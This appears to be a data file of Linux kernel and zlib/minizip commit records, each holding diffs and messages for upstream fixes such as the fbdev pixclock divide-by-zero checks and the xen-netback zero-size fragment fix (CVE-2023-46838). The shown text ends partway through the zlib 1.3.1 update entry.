- commit_diff:
  - "--- a/drivers/base/arch_topology.c\n+++ b/drivers/base/arch_topology.c\n@@ -431,9\
    \ +431,6 @@ init_cpu_capacity_callback(struct notifier_block *nb,\n \tstruct cpufreq_policy\
    \ *policy = data;\n \tint cpu;\n \n-\tif (!raw_capacity)\n-\t\treturn 0;\n-\n\
    \ \tif (val != CPUFREQ_CREATE_POLICY)\n \t\treturn 0;\n \n@@ -450,9 +447,11 @@\
    \ init_cpu_capacity_callback(struct notifier_block *nb,\n \t}\n \n \tif (cpumask_empty(cpus_to_visit))\
    \ {\n-\t\ttopology_normalize_cpu_scale();\n-\t\tschedule_work(&update_topology_flags_work);\n\
    -\t\tfree_raw_capacity();\n+\t\tif (raw_capacity) {\n+\t\t\ttopology_normalize_cpu_scale();\n\
    +\t\t\tschedule_work(&update_topology_flags_work);\n+\t\t\tfree_raw_capacity();\n\
    +\t\t}\n \t\tpr_debug(\"cpu_capacity: parsing done\\n\");\n \t\tschedule_work(&parsing_done_work);\n\
    \ \t}\n@@ -472,7 +471,7 @@ static int __init register_cpufreq_notifier(void)\n\
    \ \t * On ACPI-based systems skip registering cpufreq notifier as cpufreq\n \t\
    \ * information is not needed for cpu capacity initialization.\n \t */\n-\tif\
    \ (!acpi_disabled || !raw_capacity)\n+\tif (!acpi_disabled)\n \t\treturn -EINVAL;\n\
    \ \n \tif (!alloc_cpumask_var(&cpus_to_visit, GFP_KERNEL))"
  - "--- a/drivers/base/core.c\n+++ b/drivers/base/core.c\n@@ -125,7 +125,7 @@ static\
    \ void __fwnode_link_del(struct fwnode_link *link)\n  */\n static void __fwnode_link_cycle(struct\
    \ fwnode_link *link)\n {\n-\tpr_debug(\"%pfwf: Relaxing link with %pfwf\\n\",\n\
    +\tpr_debug(\"%pfwf: cycle: depends on %pfwf\\n\",\n \t\t link->consumer, link->supplier);\n\
    \ \tlink->flags |= FWLINK_FLAG_CYCLE;\n }\n@@ -284,10 +284,12 @@ static bool device_is_ancestor(struct\
    \ device *dev, struct device *target)\n \treturn false;\n }\n \n+#define DL_MARKER_FLAGS\t\
    \t(DL_FLAG_INFERRED | \\\n+\t\t\t\t DL_FLAG_CYCLE | \\\n+\t\t\t\t DL_FLAG_MANAGED)\n\
    \ static inline bool device_link_flag_is_sync_state_only(u32 flags)\n {\n-\treturn\
    \ (flags & ~(DL_FLAG_INFERRED | DL_FLAG_CYCLE)) ==\n-\t\t(DL_FLAG_SYNC_STATE_ONLY\
    \ | DL_FLAG_MANAGED);\n+\treturn (flags & ~DL_MARKER_FLAGS) == DL_FLAG_SYNC_STATE_ONLY;\n\
    \ }\n \n /**\n@@ -1943,6 +1945,7 @@ static bool __fw_devlink_relax_cycles(struct\
    \ device *con,\n \n \t/* Termination condition. */\n \tif (sup_dev == con) {\n\
    +\t\tpr_debug(\"----- cycle: start -----\\n\");\n \t\tret = true;\n \t\tgoto out;\n\
    \ \t}\n@@ -1974,8 +1977,11 @@ static bool __fw_devlink_relax_cycles(struct device\
    \ *con,\n \telse\n \t\tpar_dev = fwnode_get_next_parent_dev(sup_handle);\n \n\
    -\tif (par_dev && __fw_devlink_relax_cycles(con, par_dev->fwnode))\n+\tif (par_dev\
    \ && __fw_devlink_relax_cycles(con, par_dev->fwnode)) {\n+\t\tpr_debug(\"%pfwf:\
    \ cycle: child of %pfwf\\n\", sup_handle,\n+\t\t\t par_dev->fwnode);\n \t\tret\
    \ = true;\n+\t}\n \n \tif (!sup_dev)\n \t\tgoto out;\n@@ -1991,6 +1997,8 @@ static\
    \ bool __fw_devlink_relax_cycles(struct device *con,\n \n \t\tif (__fw_devlink_relax_cycles(con,\n\
    \ \t\t\t\t\t      dev_link->supplier->fwnode)) {\n+\t\t\tpr_debug(\"%pfwf: cycle:\
    \ depends on %pfwf\\n\", sup_handle,\n+\t\t\t\t dev_link->supplier->fwnode);\n\
    \ \t\t\tfw_devlink_relax_link(dev_link);\n \t\t\tdev_link->flags |= DL_FLAG_CYCLE;\n\
    \ \t\t\tret = true;\n@@ -2058,13 +2066,19 @@ static int fw_devlink_create_devlink(struct\
    \ device *con,\n \n \t/*\n \t * SYNC_STATE_ONLY device links don't block probing\
    \ and supports cycles.\n-\t * So cycle detection isn't necessary and shouldn't\
    \ be done.\n+\t * So, one might expect that cycle detection isn't necessary for\
    \ them.\n+\t * However, if the device link was marked as SYNC_STATE_ONLY because\n\
    +\t * it's part of a cycle, then we still need to do cycle detection. This\n+\t\
    \ * is because the consumer and supplier might be part of multiple cycles\n+\t\
    \ * and we need to detect all those cycles.\n \t */\n-\tif (!(flags & DL_FLAG_SYNC_STATE_ONLY))\
    \ {\n+\tif (!device_link_flag_is_sync_state_only(flags) ||\n+\t    flags & DL_FLAG_CYCLE)\
    \ {\n \t\tdevice_links_write_lock();\n \t\tif (__fw_devlink_relax_cycles(con,\
    \ sup_handle)) {\n \t\t\t__fwnode_link_cycle(link);\n \t\t\tflags = fw_devlink_get_flags(link->flags);\n\
    +\t\t\tpr_debug(\"----- cycle: end -----\\n\");\n \t\t\tdev_info(con, \"Fixed\
    \ dependency cycle(s) with %pfwf\\n\",\n \t\t\t\t sup_handle);\n \t\t}"
  - "--- a/lib/kobject.c\n+++ b/lib/kobject.c\n@@ -74,10 +74,12 @@ static int create_dir(struct\
    \ kobject *kobj)\n \tif (error)\n \t\treturn error;\n \n-\terror = sysfs_create_groups(kobj,\
    \ ktype->default_groups);\n-\tif (error) {\n-\t\tsysfs_remove_dir(kobj);\n-\t\t\
    return error;\n+\tif (ktype) {\n+\t\terror = sysfs_create_groups(kobj, ktype->default_groups);\n\
    +\t\tif (error) {\n+\t\t\tsysfs_remove_dir(kobj);\n+\t\t\treturn error;\n+\t\t\
    }\n \t}\n \n \t/*\n@@ -589,7 +591,8 @@ static void __kobject_del(struct kobject\
    \ *kobj)\n \tsd = kobj->sd;\n \tktype = get_ktype(kobj);\n \n-\tsysfs_remove_groups(kobj,\
    \ ktype->default_groups);\n+\tif (ktype)\n+\t\tsysfs_remove_groups(kobj, ktype->default_groups);\n\
    \ \n \t/* send \"remove\" if the caller did not do it but sent \"add\" */\n \t\
    if (kobj->state_add_uevent_sent && !kobj->state_remove_uevent_sent) {\n@@ -666,6\
    \ +669,10 @@ static void kobject_cleanup(struct kobject *kobj)\n \tpr_debug(\"\
    '%s' (%p): %s, parent %p\\n\",\n \t\t kobject_name(kobj), kobj, __func__, kobj->parent);\n\
    \ \n+\tif (t && !t->release)\n+\t\tpr_debug(\"'%s' (%p): does not have a release()\
    \ function, it is broken and must be fixed. See Documentation/core-api/kobject.rst.\\\
    n\",\n+\t\t\t kobject_name(kobj), kobj);\n+\n \t/* remove from sysfs if the caller\
    \ did not do it */\n \tif (kobj->state_in_sysfs) {\n \t\tpr_debug(\"'%s' (%p):\
    \ auto cleanup kobject_del\\n\",\n@@ -676,13 +683,10 @@ static void kobject_cleanup(struct\
    \ kobject *kobj)\n \t\tparent = NULL;\n \t}\n \n-\tif (t->release) {\n+\tif (t\
    \ && t->release) {\n \t\tpr_debug(\"'%s' (%p): calling ktype release\\n\",\n \t\
    \t\t kobject_name(kobj), kobj);\n \t\tt->release(kobj);\n-\t} else {\n-\t\tpr_debug(\"\
    '%s' (%p): does not have a release() function, it is broken and must be fixed.\
    \ See Documentation/core-api/kobject.rst.\\n\",\n-\t\t\t kobject_name(kobj), kobj);\n\
    \ \t}\n \n \t/* free name if we allocated it */\n@@ -1056,7 +1060,7 @@ const struct\
    \ kobj_ns_type_operations *kobj_child_ns_ops(const struct kobject *pa\n {\n \t\
    const struct kobj_ns_type_operations *ops = NULL;\n \n-\tif (parent && parent->ktype->child_ns_type)\n\
    +\tif (parent && parent->ktype && parent->ktype->child_ns_type)\n \t\tops = parent->ktype->child_ns_type(parent);\n\
    \ \n \treturn ops;"
  commit_message: "Merge tag 'driver-core-6.8-rc5' of git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/driver-core\n\
    \nPull driver core fixes from Greg KH:\n \"Here are some driver core fixes, a\
    \ kobject fix, and a documentation\n  update for 6.8-rc5. In detail these changes\
    \ are:\n\n   - devlink fixes for reported issues with 6.8-rc1\n\n   - topology\
    \ scheduling regression fix that has been reported by many\n\n   - kobject loosening\
    \ of checks change in -rc1 is now reverted as some\n     codepaths seemed to need\
    \ the checks\n\n   - documentation update for the CVE process. Has been reviewed\
    \ by\n     many, the last minute change to the document was to bring the .rst\n\
    \     format back into the the new style rules, the contents did not\n     change.\n\
    \n  All of these, except for the documentation update, have been in\n  linux-next\
    \ for over a week. The documentation update has been reviewed\n  for weeks by\
    \ a group of developers, and in public for a week and the\n  wording has stabilized\
    \ for now. If future changes are needed, we can\n  do so before 6.8-final is out\
    \ (or anytime after that)\"\n\n* tag 'driver-core-6.8-rc5' of git://git.kernel.org/pub/scm/linux/kernel/git/gregkh/driver-core:\n\
    \  Documentation: Document the Linux Kernel CVE process\n  Revert \"kobject: Remove\
    \ redundant checks for whether ktype is NULL\"\n  driver core: fw_devlink: Improve\
    \ logs for cycle detection\n  driver core: fw_devlink: Improve detection of overlapping\
    \ cycles\n  driver core: Fix device_link_flag_is_sync_state_only()\n  topology:\
    \ Set capacity_freq_ref in all cases"
  commit_sha: ced59052315615ffb3c39eb96e7b33f2cff6f781
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/drivers/video/fbdev/sis/sis_main.c\n+++ b/drivers/video/fbdev/sis/sis_main.c\n\
    @@ -1444,6 +1444,8 @@ sisfb_check_var(struct fb_var_screeninfo *var, struct fb_info\
    \ *info)\n \n \tvtotal = var->upper_margin + var->lower_margin + var->vsync_len;\n\
    \ \n+\tif (!var->pixclock)\n+\t\treturn -EINVAL;\n \tpixclock = var->pixclock;\n\
    \ \n \tif((var->vmode & FB_VMODE_MASK) == FB_VMODE_NONINTERLACED) {"
  commit_message: 'fbdev: sis: Error out if pixclock equals zero


    The userspace program could pass any values to the driver through

    ioctl() interface. If the driver doesn''t check the value of pixclock,

    it may cause divide-by-zero error.


    In sisfb_check_var(), var->pixclock is used as a divisor to caculate

    drate before it is checked against zero. Fix this by checking it

    at the beginning.


    This is similar to CVE-2022-3061 in i740fb which was fixed by

    commit 15cf0b8.


    Signed-off-by: Fullway Wang <fullwaywang@outlook.com>

    Signed-off-by: Helge Deller <deller@gmx.de>'
  commit_sha: e421946be7d9bf545147bea8419ef8239cb7ca52
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/drivers/video/fbdev/savage/savagefb_driver.c\n+++ b/drivers/video/fbdev/savage/savagefb_driver.c\n\
    @@ -869,6 +869,9 @@ static int savagefb_check_var(struct fb_var_screeninfo   *var,\n\
    \ \n \tDBG(\"savagefb_check_var\");\n \n+\tif (!var->pixclock)\n+\t\treturn -EINVAL;\n\
    +\n \tvar->transp.offset = 0;\n \tvar->transp.length = 0;\n \tswitch (var->bits_per_pixel)\
    \ {"
  commit_message: 'fbdev: savage: Error out if pixclock equals zero


    The userspace program could pass any values to the driver through

    ioctl() interface. If the driver doesn''t check the value of pixclock,

    it may cause divide-by-zero error.


    Although pixclock is checked in savagefb_decode_var(), but it is not

    checked properly in savagefb_probe(). Fix this by checking whether

    pixclock is zero in the function savagefb_check_var() before

    info->var.pixclock is used as the divisor.


    This is similar to CVE-2022-3061 in i740fb which was fixed by

    commit 15cf0b8.


    Signed-off-by: Fullway Wang <fullwaywang@outlook.com>

    Signed-off-by: Helge Deller <deller@gmx.de>'
  commit_sha: 04e5eac8f3ab2ff52fa191c187a46d4fdbc1e288
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/drivers/net/xen-netback/netback.c\n+++ b/drivers/net/xen-netback/netback.c\n\
    @@ -463,12 +463,25 @@ static void xenvif_get_requests(struct xenvif_queue *queue,\n\
    \ \t}\n \n \tfor (shinfo->nr_frags = 0; nr_slots > 0 && shinfo->nr_frags < MAX_SKB_FRAGS;\n\
    -\t     shinfo->nr_frags++, gop++, nr_slots--) {\n+\t     nr_slots--) {\n+\t\t\
    if (unlikely(!txp->size)) {\n+\t\t\tunsigned long flags;\n+\n+\t\t\tspin_lock_irqsave(&queue->response_lock,\
    \ flags);\n+\t\t\tmake_tx_response(queue, txp, 0, XEN_NETIF_RSP_OKAY);\n+\t\t\t\
    push_tx_responses(queue);\n+\t\t\tspin_unlock_irqrestore(&queue->response_lock,\
    \ flags);\n+\t\t\t++txp;\n+\t\t\tcontinue;\n+\t\t}\n+\n \t\tindex = pending_index(queue->pending_cons++);\n\
    \ \t\tpending_idx = queue->pending_ring[index];\n \t\txenvif_tx_create_map_op(queue,\
    \ pending_idx, txp,\n \t\t\t\t        txp == first ? extra_count : 0, gop);\n\
    \ \t\tfrag_set_pending_idx(&frags[shinfo->nr_frags], pending_idx);\n+\t\t++shinfo->nr_frags;\n\
    +\t\t++gop;\n \n \t\tif (txp == first)\n \t\t\ttxp = txfrags;\n@@ -481,20 +494,39\
    \ @@ static void xenvif_get_requests(struct xenvif_queue *queue,\n \t\tshinfo\
    \ = skb_shinfo(nskb);\n \t\tfrags = shinfo->frags;\n \n-\t\tfor (shinfo->nr_frags\
    \ = 0; shinfo->nr_frags < nr_slots;\n-\t\t     shinfo->nr_frags++, txp++, gop++)\
    \ {\n+\t\tfor (shinfo->nr_frags = 0; shinfo->nr_frags < nr_slots; ++txp) {\n+\t\
    \t\tif (unlikely(!txp->size)) {\n+\t\t\t\tunsigned long flags;\n+\n+\t\t\t\tspin_lock_irqsave(&queue->response_lock,\
    \ flags);\n+\t\t\t\tmake_tx_response(queue, txp, 0,\n+\t\t\t\t\t\t XEN_NETIF_RSP_OKAY);\n\
    +\t\t\t\tpush_tx_responses(queue);\n+\t\t\t\tspin_unlock_irqrestore(&queue->response_lock,\n\
    +\t\t\t\t\t\t       flags);\n+\t\t\t\tcontinue;\n+\t\t\t}\n+\n \t\t\tindex = pending_index(queue->pending_cons++);\n\
    \ \t\t\tpending_idx = queue->pending_ring[index];\n \t\t\txenvif_tx_create_map_op(queue,\
    \ pending_idx, txp, 0,\n \t\t\t\t\t\tgop);\n \t\t\tfrag_set_pending_idx(&frags[shinfo->nr_frags],\n\
    \ \t\t\t\t\t     pending_idx);\n+\t\t\t++shinfo->nr_frags;\n+\t\t\t++gop;\n \t\
    \t}\n \n-\t\tskb_shinfo(skb)->frag_list = nskb;\n-\t} else if (nskb) {\n+\t\t\
    if (shinfo->nr_frags) {\n+\t\t\tskb_shinfo(skb)->frag_list = nskb;\n+\t\t\tnskb\
    \ = NULL;\n+\t\t}\n+\t}\n+\n+\tif (nskb) {\n \t\t/* A frag_list skb was allocated\
    \ but it is no longer needed\n-\t\t * because enough slots were converted to copy\
    \ ops above.\n+\t\t * because enough slots were converted to copy ops above or\
    \ some\n+\t\t * were empty.\n \t\t */\n \t\tkfree_skb(nskb);\n \t}"
  commit_message: 'xen-netback: don''t produce zero-size SKB frags


    While frontends may submit zero-size requests (wasting a precious slot),

    core networking code as of at least 3ece782693c4b ("sock: skb_copy_ubufs

    support for compound pages") can''t deal with SKBs when they have all

    zero-size fragments. Respond to empty requests right when populating

    fragments; all further processing is fragment based and hence won''t

    encounter these empty requests anymore.


    In a way this should have been that way from the beginning: When no data

    is to be transferred for a particular request, there''s not even a point

    in validating the respective grant ref. That''s no different from e.g.

    passing NULL into memcpy() when at the same time the size is 0.


    This is XSA-448 / CVE-2023-46838.


    Cc: stable@vger.kernel.org

    Signed-off-by: Jan Beulich <jbeulich@suse.com>

    Reviewed-by: Juergen Gross <jgross@suse.com>

    Reviewed-by: Paul Durrant <paul@xen.org>'
  commit_sha: c7ec4f2d684e17d69bbdd7c4324db0ef5daac26a
  repo_name: torvalds/linux
- commit_diff:
  - "--- a/thirdparty/minizip/unzip.c\n+++ b/thirdparty/minizip/unzip.c\n@@ -117,7\
    \ +117,7 @@\n const char unz_copyright[] =\n    \" unzip 1.01 Copyright 1998-2004\
    \ Gilles Vollant - http://www.winimage.com/zLibDll\";\n \n-/* unz_file_info_interntal\
    \ contain internal info about a file in zipfile*/\n+/* unz_file_info64_internal\
    \ contain internal info about a file in zipfile*/\n typedef struct unz_file_info64_internal_s\n\
    \ {\n     ZPOS64_T offset_curfile;/* relative offset of local header 8 bytes */\n\
    @@ -500,9 +500,9 @@ local unzFile unzOpenInternal(const void *path,\n     ZPOS64_T\
    \ central_pos;\n     uLong   uL;\n \n-    uLong number_disk;          /* number\
    \ of the current dist, used for\n+    uLong number_disk;          /* number of\
    \ the current disk, used for\n                                    spanning ZIP,\
    \ unsupported, always 0*/\n-    uLong number_disk_with_CD;  /* number the the\
    \ disk with central dir, used\n+    uLong number_disk_with_CD;  /* number the\
    \ disk with central dir, used\n                                    for spanning\
    \ ZIP, unsupported, always 0*/\n     ZPOS64_T number_entry_CD;      /* total number\
    \ of entries in\n                                    the central dir"
  - "--- a/thirdparty/minizip/zip.c\n+++ b/thirdparty/minizip/zip.c\n@@ -614,9 +614,9\
    \ @@ local int LoadCentralDirectoryRecord(zip64_internal* pziinit) {\n   ZPOS64_T\
    \ central_pos;\n   uLong uL;\n \n-  uLong number_disk;          /* number of the\
    \ current dist, used for\n+  uLong number_disk;          /* number of the current\
    \ disk, used for\n                               spanning ZIP, unsupported, always\
    \ 0*/\n-  uLong number_disk_with_CD;  /* number the the disk with central dir,\
    \ used\n+  uLong number_disk_with_CD;  /* number of the disk with central dir,\
    \ used\n                               for spanning ZIP, unsupported, always 0*/\n\
    \   ZPOS64_T number_entry;\n   ZPOS64_T number_entry_CD;      /* total number\
    \ of entries in\n@@ -1876,7 +1876,7 @@ extern int ZEXPORT zipClose(zipFile file,\
    \ const char* global_comment) {\n     free_linkedlist(&(zi->central_dir));\n \n\
    \     pos = centraldir_pos_inzip - zi->add_position_when_writing_offset;\n-  \
    \  if(pos >= 0xffffffff || zi->number_entry > 0xFFFF)\n+    if(pos >= 0xffffffff\
    \ || zi->number_entry >= 0xFFFF)\n     {\n       ZPOS64_T Zip64EOCDpos = ZTELL64(zi->z_filefunc,zi->filestream);\n\
    \       Write_Zip64EndOfCentralDirectoryRecord(zi, size_centraldir, centraldir_pos_inzip);"
  - "--- a/thirdparty/zlib/deflate.c\n+++ b/thirdparty/zlib/deflate.c\n@@ -1,5 +1,5\
    \ @@\n /* deflate.c -- compress data using the deflation algorithm\n- * Copyright\
    \ (C) 1995-2023 Jean-loup Gailly and Mark Adler\n+ * Copyright (C) 1995-2024 Jean-loup\
    \ Gailly and Mark Adler\n  * For conditions of distribution and use, see copyright\
    \ notice in zlib.h\n  */\n \n@@ -52,7 +52,7 @@\n #include \"deflate.h\"\n \n const\
    \ char deflate_copyright[] =\n-   \" deflate 1.3 Copyright 1995-2023 Jean-loup\
    \ Gailly and Mark Adler \";\n+   \" deflate 1.3.1 Copyright 1995-2024 Jean-loup\
    \ Gailly and Mark Adler \";\n /*\n   If you use the zlib library in a product,\
    \ an acknowledgment is welcome\n   in the documentation of your product. If for\
    \ some reason you cannot\n@@ -493,7 +493,7 @@ int ZEXPORT deflateInit2_(z_streamp\
    \ strm, int level, int method,\n      * symbols from which it is being constructed.\n\
    \      */\n \n-    s->pending_buf = (uchf *) ZALLOC(strm, s->lit_bufsize, 4);\n\
    +    s->pending_buf = (uchf *) ZALLOC(strm, s->lit_bufsize, LIT_BUFS);\n     s->pending_buf_size\
    \ = (ulg)s->lit_bufsize * 4;\n \n     if (s->window == Z_NULL || s->prev == Z_NULL\
    \ || s->head == Z_NULL ||\n@@ -503,8 +503,14 @@ int ZEXPORT deflateInit2_(z_streamp\
    \ strm, int level, int method,\n         deflateEnd (strm);\n         return Z_MEM_ERROR;\n\
    \     }\n+#ifdef LIT_MEM\n+    s->d_buf = (ushf *)(s->pending_buf + (s->lit_bufsize\
    \ << 1));\n+    s->l_buf = s->pending_buf + (s->lit_bufsize << 2);\n+    s->sym_end\
    \ = s->lit_bufsize - 1;\n+#else\n     s->sym_buf = s->pending_buf + s->lit_bufsize;\n\
    \     s->sym_end = (s->lit_bufsize - 1) * 3;\n+#endif\n     /* We avoid equality\
    \ with lit_bufsize*3 because of wraparound at 64K\n      * on 16 bit machines\
    \ and because stored blocks are restricted to\n      * 64K-1 bytes.\n@@ -720,9\
    \ +726,15 @@ int ZEXPORT deflatePrime(z_streamp strm, int bits, int value) {\n\
    \ \n     if (deflateStateCheck(strm)) return Z_STREAM_ERROR;\n     s = strm->state;\n\
    +#ifdef LIT_MEM\n+    if (bits < 0 || bits > 16 ||\n+        (uchf *)s->d_buf\
    \ < s->pending_out + ((Buf_size + 7) >> 3))\n+        return Z_BUF_ERROR;\n+#else\n\
    \     if (bits < 0 || bits > 16 ||\n         s->sym_buf < s->pending_out + ((Buf_size\
    \ + 7) >> 3))\n         return Z_BUF_ERROR;\n+#endif\n     do {\n         put\
    \ = Buf_size - s->bi_valid;\n         if (put > bits)\n@@ -1294,7 +1306,7 @@ int\
    \ ZEXPORT deflateCopy(z_streamp dest, z_streamp source) {\n     ds->window = (Bytef\
    \ *) ZALLOC(dest, ds->w_size, 2*sizeof(Byte));\n     ds->prev   = (Posf *)  ZALLOC(dest,\
    \ ds->w_size, sizeof(Pos));\n     ds->head   = (Posf *)  ZALLOC(dest, ds->hash_size,\
    \ sizeof(Pos));\n-    ds->pending_buf = (uchf *) ZALLOC(dest, ds->lit_bufsize,\
    \ 4);\n+    ds->pending_buf = (uchf *) ZALLOC(dest, ds->lit_bufsize, LIT_BUFS);\n\
    \ \n     if (ds->window == Z_NULL || ds->prev == Z_NULL || ds->head == Z_NULL\
    \ ||\n         ds->pending_buf == Z_NULL) {\n@@ -1305,10 +1317,15 @@ int ZEXPORT\
    \ deflateCopy(z_streamp dest, z_streamp source) {\n     zmemcpy(ds->window, ss->window,\
    \ ds->w_size * 2 * sizeof(Byte));\n     zmemcpy((voidpf)ds->prev, (voidpf)ss->prev,\
    \ ds->w_size * sizeof(Pos));\n     zmemcpy((voidpf)ds->head, (voidpf)ss->head,\
    \ ds->hash_size * sizeof(Pos));\n-    zmemcpy(ds->pending_buf, ss->pending_buf,\
    \ (uInt)ds->pending_buf_size);\n+    zmemcpy(ds->pending_buf, ss->pending_buf,\
    \ ds->lit_bufsize * LIT_BUFS);\n \n     ds->pending_out = ds->pending_buf + (ss->pending_out\
    \ - ss->pending_buf);\n+#ifdef LIT_MEM\n+    ds->d_buf = (ushf *)(ds->pending_buf\
    \ + (ds->lit_bufsize << 1));\n+    ds->l_buf = ds->pending_buf + (ds->lit_bufsize\
    \ << 2);\n+#else\n     ds->sym_buf = ds->pending_buf + ds->lit_bufsize;\n+#endif\n\
    \ \n     ds->l_desc.dyn_tree = ds->dyn_ltree;\n     ds->d_desc.dyn_tree = ds->dyn_dtree;\n\
    @@ -1539,13 +1556,21 @@ local uInt longest_match(deflate_state *s, IPos cur_match)\
    \ {\n  */\n local void check_match(deflate_state *s, IPos start, IPos match, int\
    \ length) {\n     /* check that the match is indeed a match */\n-    if (zmemcmp(s->window\
    \ + match,\n-                s->window + start, length) != EQUAL) {\n-       \
    \ fprintf(stderr, \" start %u, match %u, length %d\\n\",\n-                start,\
    \ match, length);\n+    Bytef *back = s->window + (int)match, *here = s->window\
    \ + start;\n+    IPos len = length;\n+    if (match == (IPos)-1) {\n+        /*\
    \ match starts one byte before the current window -- just compare the\n+     \
    \      subsequent length-1 bytes */\n+        back++;\n+        here++;\n+   \
    \     len--;\n+    }\n+    if (zmemcmp(back, here, len) != EQUAL) {\n+       \
    \ fprintf(stderr, \" start %u, match %d, length %d\\n\",\n+                start,\
    \ (int)match, length);\n         do {\n-            fprintf(stderr, \"%c%c\",\
    \ s->window[match++], s->window[start++]);\n-        } while (--length != 0);\n\
    +            fprintf(stderr, \"(%02x %02x)\", *back++, *here++);\n+        } while\
    \ (--len != 0);\n         z_error(\"invalid match\");\n     }\n     if (z_verbose\
    \ > 1) {"
  - "--- a/thirdparty/zlib/gzlib.c\n+++ b/thirdparty/zlib/gzlib.c\n@@ -1,5 +1,5 @@\n\
    \ /* gzlib.c -- zlib functions common to reading and writing gzip files\n- * Copyright\
    \ (C) 2004-2019 Mark Adler\n+ * Copyright (C) 2004-2024 Mark Adler\n  * For conditions\
    \ of distribution and use, see copyright notice in zlib.h\n  */\n \n@@ -563,20\
    \ +563,20 @@ void ZLIB_INTERNAL gz_error(gz_statep state, int err, const char\
    \ *msg) {\n #endif\n }\n \n-#ifndef INT_MAX\n /* portably return maximum value\
    \ for an int (when limits.h presumed not\n    available) -- we need to do this\
    \ to cover cases where 2's complement not\n    used, since C standard permits\
    \ 1's complement and sign-bit representations,\n    otherwise we could just use\
    \ ((unsigned)-1) >> 1 */\n unsigned ZLIB_INTERNAL gz_intmax(void) {\n-    unsigned\
    \ p, q;\n-\n-    p = 1;\n+#ifdef INT_MAX\n+    return INT_MAX;\n+#else\n+    unsigned\
    \ p = 1, q;\n     do {\n         q = p;\n         p <<= 1;\n         p++;\n  \
    \   } while (p > q);\n     return q >> 1;\n-}\n #endif\n+}"
  - "--- a/thirdparty/zlib/inflate.c\n+++ b/thirdparty/zlib/inflate.c\n@@ -1387,7\
    \ +1387,7 @@ int ZEXPORT inflateSync(z_streamp strm) {\n     /* if first time,\
    \ start search in bit buffer */\n     if (state->mode != SYNC) {\n         state->mode\
    \ = SYNC;\n-        state->hold <<= state->bits & 7;\n+        state->hold >>=\
    \ state->bits & 7;\n         state->bits -= state->bits & 7;\n         len = 0;\n\
    \         while (state->bits >= 8) {"
  - "--- a/thirdparty/zlib/inftrees.c\n+++ b/thirdparty/zlib/inftrees.c\n@@ -1,5 +1,5\
    \ @@\n /* inftrees.c -- generate Huffman trees for efficient decoding\n- * Copyright\
    \ (C) 1995-2023 Mark Adler\n+ * Copyright (C) 1995-2024 Mark Adler\n  * For conditions\
    \ of distribution and use, see copyright notice in zlib.h\n  */\n \n@@ -9,7 +9,7\
    \ @@\n #define MAXBITS 15\n \n const char inflate_copyright[] =\n-   \" inflate\
    \ 1.3 Copyright 1995-2023 Mark Adler \";\n+   \" inflate 1.3.1 Copyright 1995-2024\
    \ Mark Adler \";\n /*\n   If you use the zlib library in a product, an acknowledgment\
    \ is welcome\n   in the documentation of your product. If for some reason you\
    \ cannot\n@@ -57,7 +57,7 @@ int ZLIB_INTERNAL inflate_table(codetype type, unsigned\
    \ short FAR *lens,\n         35, 43, 51, 59, 67, 83, 99, 115, 131, 163, 195, 227,\
    \ 258, 0, 0};\n     static const unsigned short lext[31] = { /* Length codes 257..285\
    \ extra */\n         16, 16, 16, 16, 16, 16, 16, 16, 17, 17, 17, 17, 18, 18, 18,\
    \ 18,\n-        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 198, 203};\n\
    +        19, 19, 19, 19, 20, 20, 20, 20, 21, 21, 21, 21, 16, 203, 77};\n     static\
    \ const unsigned short dbase[32] = { /* Distance codes 0..29 base */\n       \
    \  1, 2, 3, 4, 5, 7, 9, 13, 17, 25, 33, 49, 65, 97, 129, 193,\n         257, 385,\
    \ 513, 769, 1025, 1537, 2049, 3073, 4097, 6145,"
  - "--- a/thirdparty/zlib/trees.c\n+++ b/thirdparty/zlib/trees.c\n@@ -1,5 +1,5 @@\n\
    \ /* trees.c -- output deflated data using Huffman coding\n- * Copyright (C) 1995-2021\
    \ Jean-loup Gailly\n+ * Copyright (C) 1995-2024 Jean-loup Gailly\n  * detect_data_type()\
    \ function provided freely by Cosmin Truta, 2006\n  * For conditions of distribution\
    \ and use, see copyright notice in zlib.h\n  */\n@@ -899,14 +899,19 @@ local void\
    \ compress_block(deflate_state *s, const ct_data *ltree,\n                   \
    \        const ct_data *dtree) {\n     unsigned dist;      /* distance of matched\
    \ string */\n     int lc;             /* match length or unmatched char (if dist\
    \ == 0) */\n-    unsigned sx = 0;    /* running index in sym_buf */\n+    unsigned\
    \ sx = 0;    /* running index in symbol buffers */\n     unsigned code;      /*\
    \ the code to send */\n     int extra;          /* number of extra bits to send\
    \ */\n \n     if (s->sym_next != 0) do {\n+#ifdef LIT_MEM\n+        dist = s->d_buf[sx];\n\
    +        lc = s->l_buf[sx++];\n+#else\n         dist = s->sym_buf[sx++] & 0xff;\n\
    \         dist += (unsigned)(s->sym_buf[sx++] & 0xff) << 8;\n         lc = s->sym_buf[sx++];\n\
    +#endif\n         if (dist == 0) {\n             send_code(s, lc, ltree); /* send\
    \ a literal byte */\n             Tracecv(isgraph(lc), (stderr,\" '%c' \", lc));\n\
    @@ -931,8 +936,12 @@ local void compress_block(deflate_state *s, const ct_data\
    \ *ltree,\n             }\n         } /* literal or match pair ? */\n \n-    \
    \    /* Check that the overlay between pending_buf and sym_buf is ok: */\n+  \
    \      /* Check for no overlay of pending_buf on needed symbols */\n+#ifdef LIT_MEM\n\
    +        Assert(s->pending < 2 * (s->lit_bufsize + sx), \"pendingBuf overflow\"\
    );\n+#else\n         Assert(s->pending < s->lit_bufsize + sx, \"pendingBuf overflow\"\
    );\n+#endif\n \n     } while (sx < s->sym_next);\n \n@@ -1082,9 +1091,14 @@ void\
    \ ZLIB_INTERNAL _tr_flush_block(deflate_state *s, charf *buf,\n  * the current\
    \ block must be flushed.\n  */\n int ZLIB_INTERNAL _tr_tally(deflate_state *s,\
    \ unsigned dist, unsigned lc) {\n+#ifdef LIT_MEM\n+    s->d_buf[s->sym_next] =\
    \ (ush)dist;\n+    s->l_buf[s->sym_next++] = (uch)lc;\n+#else\n     s->sym_buf[s->sym_next++]\
    \ = (uch)dist;\n     s->sym_buf[s->sym_next++] = (uch)(dist >> 8);\n     s->sym_buf[s->sym_next++]\
    \ = (uch)lc;\n+#endif\n     if (dist == 0) {\n         /* lc is the unmatched\
    \ char */\n         s->dyn_ltree[lc].Freq++;"
  commit_message: 'zlib/minizip: Update to version 1.3.1


